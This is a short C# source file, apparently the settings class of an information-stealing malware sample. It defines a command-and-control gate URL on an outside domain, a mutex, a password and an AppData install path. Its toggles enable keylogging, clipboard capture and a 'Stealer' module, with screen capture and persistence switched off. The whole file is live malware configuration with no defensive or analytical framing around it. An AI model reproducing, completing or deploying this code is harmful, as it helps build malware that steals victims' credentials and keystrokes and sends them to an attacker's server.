using System;

internal class Settings
{
	public static string ID = ComputerInfo.UniqueID();

	public static string Password = "Arcanum";

	public static string Encryption = "encryption";

	public static string Version = "1.0.0.0";

	public static string Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

	public static string URL = "http://fuckthepolice.ml/h/gate.php/";

	public static string Mutex = "100aa699-d5a1-455c-9ac7-8acb9ab0bf23";

	public static int Interval = 10;

	public static int Quality = 73;

	public static bool Startup = false;

	public static bool Persistance = false;

	public static bool Keyboard = true;

	public static bool Clipboard = true;

	public static bool Screen = false;

	public static bool Stealer = true;
}
